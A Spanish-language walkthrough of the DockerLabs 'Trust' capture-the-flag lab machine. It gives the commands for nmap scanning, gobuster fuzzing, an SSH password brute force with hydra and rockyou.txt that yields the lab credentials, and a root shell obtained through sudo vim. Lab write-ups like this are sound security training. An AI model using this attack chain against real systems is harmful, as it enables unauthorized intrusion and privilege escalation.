Máquina: [Trust](https://dockerlabs.es/#/#Trust), from DockerLabs

## 1) Me anoto la IP que es fundamental para saber a quien atacar

## 2) nmap para identificar posibles puertos abiertos
```
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 172.17.0.2
```
Cada parámetro:

`-p-: quiero explorar los 65535 puertos pues no se cual puede estar abierto`\
`--open: sólo me importan los abiertos, ni cerrados ni filtrados`\
`-sS: quiero que haga stealth scanning, es un escaneo silencioso que no completa el 3 way handshake`\
`-vvv: que sea bien verboso, a medida que encuentra un resultado, lo escupa`\
`---min-rate XXXX: que sea veloz y no mande menos de tantos pkg por segundo`\
`-n: no quiero resolución DNS, es lento`\
`-Pn: deshabilito ICMP echo requests para ahorrar tiempo`

##3) Una vez identificados posibles puertos abiertos quiero ser más exhaustivo con el análisis de cada uno
```
nmap -p22,80 -sC -vvv 172.17.0.2
```
`-p22,80: acá pongo los puertos que me identificó como abiertos previamente`\
`-sC: el tipo de script que quiero que corra para realizar un escaneo, es el default, scripts en Lua. Va a brindar información sobre el host y tecnologias que usa`\

## 4) otra utilidad para conocer detalles de la IP víctima es whatweb
`whatweb 172.17.0.2`
Da información sobre el sistema operativo, la versión de Apache o lo que estuviese corriendo, y más.

## 5) Ahora voy a hacer fuzzing para investigar qué endpoints hay
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -x php,txt
```
Hago fuzzing por medio de gobuster y utilizando una lista de palabras

`dir: para utilizar el modo de enumeración de archivos/directorios `\
`-w <PATH>: la lista de palabras a utilizar para el fuzz`\
`-t X: cantidad de threads concurrentes`\
`-x php,txt el tipo de extensiones a buscar (ej. index.php, secrets.txt) `\

Encontré una página:
/secret.php --> dice "Hola Mario"

## 6) Como la página dice 'Hola Mario' y previamente con nmap descubrí que el puerto 22 (SSH) estaba abierto, pienso hacerle fuerza bruta al usuario mario/root.
```
hydra -l mario -P /usr/share/wordlists/rockyou.txt <IP> -t 64
```
`-l <USER>: seteo el USER, el nombre de logeo`\
`-P <FILE>: cargo el archivo con contraseñas para hacer fuerza bruta`\
`-t N: cuantas tareas correr en paralelo por cada ataque`\

Encontré la contraseña del usuario mario:
user: mario | passw: chocolate

Pero necesito la del usuario root

## 7) Necesito escalar privilegios desde el user mario al user root
```
sudo -l
```
Verifico si el usuario actual tiene algún tipo de permiso especial.
Resulta que tiene permiso para correr cualquier cosa con `/usr/bin/vim`. Con lo cual si puedo correr a nivel de sudo vim, puedo aprovechar y ejecutar un comando junto con el launch de vim, por ejemplo
```
sudo /usr/bin/vim -c ':!/bin/bash'
```
Esto me va a abrir una terminal de bash en la cual seré un usuario root. Una vez que cierre esa bash me va a devolver a vim. Sin embargo acá ya termina la máquina pues logré acceder al usuario root.

## Resumen del ataque

Este método funcionó por lo siguiente:
* Los puertos de SSH y HTTP (22,80) están abiertos
* Encontramos un endpoint que advirtió del nombre de un usuario: Mario
* La password del usuario era muy simple y se le pudo hacer fuerza bruta, logrando conexión via SSH
* El usuario puede correr `/usr/bin/vim` como root
